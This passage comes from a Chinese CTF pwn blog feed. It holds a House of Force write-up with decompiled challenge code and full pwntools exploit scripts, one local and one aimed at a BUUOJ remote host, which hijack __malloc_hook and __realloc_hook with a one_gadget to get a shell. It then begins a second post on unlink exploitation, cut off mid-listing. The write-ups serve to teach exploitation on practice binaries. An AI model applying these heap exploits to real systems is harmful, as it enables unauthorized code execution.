class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">255</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">255</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1:add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2:puts&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, nptr, <span class="number">0xFuLL</span>);</span><br><span class="line">    v3 = <span class="built_in">atol</span>(nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">show</span>();                                   <span class="comment">// 没什么用的puts</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><font size="4"><strong>add</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240926131129316.bmp"></p><h3 id="思路分析-本地运行分析"><a href="#思路分析-本地运行分析" class="headerlink" title="思路分析(本地运行分析)"></a>思路分析(本地运行分析)</h3><ul><li>只有一个add函数，只要malloc size小于0x50，就存在堆溢出，可以用来修改top chunk size</li></ul><p><font size="4" color="red"><strong>泄露Libc</strong></font></p><ul><li>但是如何泄露libc呢？如开头所说，神奇的泄露libc，我们malloc一个很大的size，此时是通过mmap分配的chunk，该chunk的地址和libc存在固定的偏移，如下：</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;bbbb&#x27;</span>) + <span class="number">0x3ffff0</span> <span class="comment"># libc文件不同，偏移不同</span></span><br><span class="line">success(<span class="string">&quot;libc_base address : &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240926132253352.bmp"></p><ul><li>左边就是泄露的地址，右边是libc的地址，固定偏移在gdb里面用distance求一下即可，这样我们就获得了libc的基地址</li></ul><p><font size="4" color="red">实现HOF</font></p><ul><li>接下来就是修改topchunk的size,并且为修改malloc_hook做好准备</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有堆溢出，可打House of Force</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heapaddr = add(<span class="number">0x10</span>,payload) <span class="comment"># size = 0x21,topchunk在该chunk的+0x10处</span></span><br><span class="line">success(<span class="string">&quot;chunk0 address : &quot;</span>+<span class="built_in">hex</span>(heapaddr))</span><br><span class="line">top = heapaddr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment"># one= [0x45216,0x4526a,0xf02a4,0xf1147]  # 远程环境的onegadget</span></span><br><span class="line">onegadget = libc_base + <span class="number">0x4527a</span> <span class="comment"># 本地偏移</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br></pre></td></tr></table></figure></div><ul><li>简单的溢出修改top chunk 的 size，并且通过chunk0获得top chunk的地址，通过libc基地址获得对应函数地址</li><li><strong>下面就是任意地址写了，先要确定offset是多少。</strong>这里我们要修改malloc_hook函数为onegadget,那么offset 就是malloc_hook - top chunk</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">offset =  malloc_hook - top </span><br></pre></td></tr></table></figure></div><ul><li>偏移确认完成，正式的运用却是offset-0x20，-0x10用于对于，-0x10将malloc_hook放到user data部分</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(onegadget))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240926190835186.bmp"></p><ul><li>最后只需要再次调用malloc即可，但是可以发现，将onegadget都试完，也是无法getshell的，为什么呢?</li></ul><p><font size="4" color="red">realloc和malloc共同利用</font></p><ul><li>参考我写的：[这篇文章](<a class="link" href="https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc#">https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc# <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 《fastbin_attack》)</li><li>所以我们还需要将offset-0x10，去修改realloc_hook为onegadget，然后将malloc函数修改为realloc+n的位置(也是需要尝试的，一般是0x4)</li><li>当我们调用malloc的时候，先执行push,将rsp往低地址调，然后执行realloc_hook即onegadget，从而getshell.</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(onegadget) + p64(realloc+<span class="number">0x4</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240926192847620.bmp"></p><h3 id="本地完整EXP"><a href="#本地完整EXP" class="headerlink" title="本地完整EXP"></a>本地完整EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>) <span class="comment"># 本地</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;addr 0x&quot;</span>)</span><br><span class="line">    heapaddr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    <span class="keyword">return</span> heapaddr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对size无限制，malloc大chunk使得mmap分配chunk</span></span><br><span class="line"><span class="comment"># 该chunk和libc有固定的偏移</span></span><br><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;bbbb&#x27;</span>) + <span class="number">0x3ffff0</span></span><br><span class="line">success(<span class="string">&quot;libc_base address : &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有堆溢出，可打House of Force</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heapaddr = add(<span class="number">0x10</span>,payload) <span class="comment"># size = 0x21,topchunk在该chunk的+0x10处</span></span><br><span class="line">success(<span class="string">&quot;chunk0 address : &quot;</span>+<span class="built_in">hex</span>(heapaddr))</span><br><span class="line">top = heapaddr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] </span><br><span class="line">onegadget = libc_base + <span class="number">0x4527a</span> <span class="comment"># 本地的onegadget </span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;onegadget : &quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(onegadget) + p64(realloc+<span class="number">0x4</span>))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="远程完整EXP"><a href="#远程完整EXP" class="headerlink" title="远程完整EXP"></a>远程完整EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28245</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;) # 本地</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;addr 0x&quot;</span>)</span><br><span class="line">    heapaddr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    <span class="keyword">return</span> heapaddr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对size无限制，malloc大chunk使得mmap分配chunk</span></span><br><span class="line"><span class="comment"># 该chunk和libc有固定的偏移</span></span><br><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;bbbb&#x27;</span>) + <span class="number">0x200ff0</span> <span class="comment"># libc不同,偏移不同</span></span><br><span class="line">success(<span class="string">&quot;libc_base address : &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有堆溢出，可打House of Force</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heapaddr = add(<span class="number">0x10</span>,payload) <span class="comment"># size = 0x21,topchunk在该chunk的+0x10处</span></span><br><span class="line">success(<span class="string">&quot;chunk0 address : &quot;</span>+<span class="built_in">hex</span>(heapaddr))</span><br><span class="line">top = heapaddr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] <span class="comment"># </span></span><br><span class="line"><span class="comment"># one= [0x45216,0x4526a,0xf02a4,0xf1147] </span></span><br><span class="line">onegadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;onegadget : &quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(onegadget) + p64(realloc+<span class="number">0x4</span>)) <span class="comment"># +0x10也是可以的</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctfpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zctf2016_note2-unlink(unlink精讲)</title>
      <link href="/2024/09/25/zctf2016-note2-unlink/"/>
      <url>/2024/09/25/zctf2016-note2-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="无法堆溢出修改chunk的unlink-整数溢出"><a href="#无法堆溢出修改chunk的unlink-整数溢出" class="headerlink" title="无法堆溢出修改chunk的unlink+整数溢出"></a>无法堆溢出修改chunk的unlink+整数溢出</h1><p><a class="link" href="https://buuoj.cn/challenges#zctf2016_note2">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>有符号整型与无符号整型比较 -&gt; 存在溢出</p><h1 id="unlink完整表示"><a href="#unlink完整表示" class="headerlink" title="unlink完整表示"></a>unlink完整表示</h1><ul><li><strong>以往的unlink都是可以堆溢出修改相邻chunk的prev_size以及其size_inuse</strong>，然后构造出一个fake_free_chunk，然后free相邻的chunk，这两个chunk就会合并，从而达到unlink的效果，如下图：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../unlink.drawio.png"></p><ul><li>接着上图讲：chunk1是构造成了一个fake_chunk，接着free(chunk2),那么这两个chunk将会合并，从而绕过检测，达到unlink的效果。</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于unsorted bin 双向链表的检测</span></span><br><span class="line">chunk FD表示chunk的下一个chunk BK表示chunk的上一个chunk</span><br><span class="line">chunk.fd -&gt; FD  FD.bk -&gt; chunk      chunk.bk -&gt; BK   BK.fd -&gt; chunk</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../unlink2.jpg"></p><ul><li>如上图，相当于把heap[0]迁移到了 -0x18的位置，这就是完整的unlink利用方法。</li></ul><h1 id="ida程序执行流分析"><a href="#ida程序执行流分析" class="headerlink" title="ida程序执行流分析"></a>ida程序执行流分析</h1><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">0x3Cu</span>);</span><br><span class="line">  <span class="comment">// 下面这两步随便输入，对于Unlink没有影响</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  <span class="built_in">input1</span>(&amp;unk_<span class="number">6020E0</span>, <span class="number">64LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your address:&quot;</span>);</span><br><span class="line">  <span class="built_in">input1</span>(&amp;unk_602180, <span class="number">96LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( <span class="built_in">menu</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="built_in">add</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">show</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="built_in">edit</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><ul><li>对于size有要求</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> add()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="built_in">int</span> v1; // eax</span><br><span class="line">  unsigned <span class="built_in">int</span> size; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  void *chunk_data_addr; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( heapidx &gt; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;note lists are full&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;Input the length of the note content:(less than 128)&quot;</span>);</span><br><span class="line">  size = <span class="built_in">input</span>();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x80</span> )                            // size &lt;= <span class="number">0x80</span></span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;Too long&quot;</span>);</span><br><span class="line">  chunk_data_addr = malloc(size);</span><br><span class="line">  puts(<span class="string">&quot;Input the note content:&quot;</span>);</span><br><span class="line">  input1(chunk_data_addr, size, <span class="number">10</span>);</span><br><span class="line">  sub_400B10(chunk_data_addr);</span><br><span class="line">  *(&amp;heaplist + heapidx) = chunk_data_addr;</span><br><span class="line">  chunk_size[heapidx] = size;</span><br><span class="line">  v1 = heapidx++;</span><br><span class="line">  <span class="keyword">return</span> printf(<span class="string">&quot;note add success, the id is %d\n&quot;</span>, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><ul><li>%s输出，可以泄露libc</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  <span class="built_in">LODWORD</span>(v0) = <span class="built_in">input</span>();</span><br><span class="line">  idx = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(&amp;heaplist + v0);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">      <span class="built_in">LODWORD</span>(v0) = <span class="built_in">printf</span>(<span class="string">&quot;Content is %s\n&quot;</span>, *(&amp;heaplist + idx));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><ul><li>最复杂的地方，也是最重要的地方，其实只需要关注输入1的overwrite</li><li>这里是先malloc了一个(0xa0)的chunk，然后向该chunk填入数据，进行overwrite，最后free掉这个</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 